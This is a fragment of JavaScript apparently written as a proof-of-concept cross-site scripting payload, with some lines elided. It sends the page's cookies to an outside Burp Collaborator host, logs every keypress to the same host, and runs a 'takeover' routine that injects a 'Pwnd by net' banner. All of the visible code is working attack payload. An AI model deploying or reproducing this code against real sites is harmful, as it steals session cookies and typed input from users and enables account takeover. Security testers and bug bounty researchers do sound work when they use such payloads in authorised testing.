...
fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net/log?c=" + encodeURIComponent(document.cookie));

// 3. Keylogger (PoC: sends each keypress)
document.addEventListener("keypress", function(e) { 
    fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net?key=" + encodeURIComponent(e.key));
});
...
(function takeover() {
    let takeoverInterval = setInterval(() => {
        if (document.body) {
            ...
            banner.innerText = "⚠ NET POC: Pwnd by net";
